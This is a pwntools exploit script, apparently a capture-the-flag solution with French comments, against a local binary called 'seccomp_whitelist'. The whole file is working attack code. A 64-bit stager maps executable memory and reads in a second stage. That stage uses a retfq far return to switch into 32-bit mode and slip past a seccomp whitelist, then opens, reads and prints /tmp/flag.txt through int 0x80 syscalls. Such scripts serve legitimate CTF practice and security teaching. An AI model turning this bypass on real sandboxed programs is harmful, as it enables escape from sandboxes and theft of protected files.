from pwn import *

exe = ELF('./seccomp_whitelist')

def conn():
    if args.GDB:
        return gdb.debug(exe.path)
    else:
        return process(exe.path)

# Chemin du fichier à lire
path = b"/tmp/flag.txt\x00"
# Shellcode 32-bit
with context.local(arch='i386'):
    shellcode_32 = asm("""
            jmp get_path
        back:
            pop ebx
            mov eax, 5
            xor ecx, ecx
            xor edx, edx
            int 0x80

            mov ebx, eax
            mov eax, 3
            sub esp, 100
            mov ecx, esp
            mov edx, 100
            int 0x80

            mov edx, eax
            mov eax, 4
            mov ebx, 1
            int 0x80

            xor eax, eax
            inc eax
            xor ebx, ebx
            int 0x80
        get_path:
            call back
        """)
    shellcode_32 += path

# Switch 32-bit - retfq corrigé
switch_32 = asm("""
    mov rsp, 0x7f0000
    add rsp, 0x200
    push 0x23
    push 0x7f0017
    retfq
""", arch='amd64')

final_sh = switch_32 + shellcode_32

# Stager principal
full_shellcode_asm = f"""
xor rax, rax
mov al, 9
mov rdi, 0x7f0000
mov rsi, 4096
mov dl, 7
xor r10, r10
mov r10b, 0x32
mov r8, -1
xor r9, r9
syscall

mov rbx, rax
xor rax, rax
xor rdi, rdi
mov rsi, rbx
mov rdx, {len(final_sh)}
syscall

jmp rbx
"""

sh = asm(full_shellcode_asm, arch='amd64')

io = conn()
io.sendafter(b"Entrez votre shellcode : \n", sh)
sleep(0.1)
io.send(final_sh)
io.interactive()